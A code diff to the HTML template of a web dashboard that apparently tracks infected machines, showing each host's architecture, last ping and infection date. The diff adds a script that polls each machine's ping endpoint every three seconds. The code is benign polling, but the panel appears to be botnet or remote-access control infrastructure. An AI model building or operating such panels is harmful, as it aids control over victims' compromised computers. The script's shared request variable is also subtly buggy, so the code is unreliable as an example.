@@ -112,7 +112,7 @@
                                                                         <span class="tb-sub">{{ machine.architecture }}</span>
                                                                     </div>
                                                                     <div class="nk-tb-col tb-col-lg">
-                                                                        <span class="tb-sub"> {{ machine.last_ping }}</span>
+                                                                        <span class="tb-sub" id="ping-{{ machine.id }}"> {{ machine.last_ping }}</span>
                                                                     </div>
                                                                     <div class="nk-tb-col tb-col-lg">
                                                                         <span class="tb-sub"> {{ machine.infected_on }}</span>
@@ -157,6 +157,28 @@
                 </div>
             </div>
         </div>
+
+        <script>
+            window.addEventListener("load",function(){
+                UpdatePing();
+            },false);
+
+            function UpdatePing()
+            {
+                {% for machine in machines %}
+                    var xhttp = new XMLHttpRequest();
+                    xhttp.onreadystatechange = function() {
+                        if (this.readyState == 4 && this.status == 200) {
+                            document.getElementById("ping-{{ machine.id }}").innerHTML = JSON.parse(xhttp.responseText).last_ping;
+                        }
+                    };
+                    xhttp.open("GET", "/dashboard/machines/{{ machine.id }}/ping", true);
+                    xhttp.send();
+                {% endfor %}
+
+                setTimeout(UpdatePing, 3000);
+            }
+        </script>
     
         <script src="/js/bundle.js?ver=2.6.0"></script>
         <script src="/js/scripts.js?ver=2.6.0"></script>
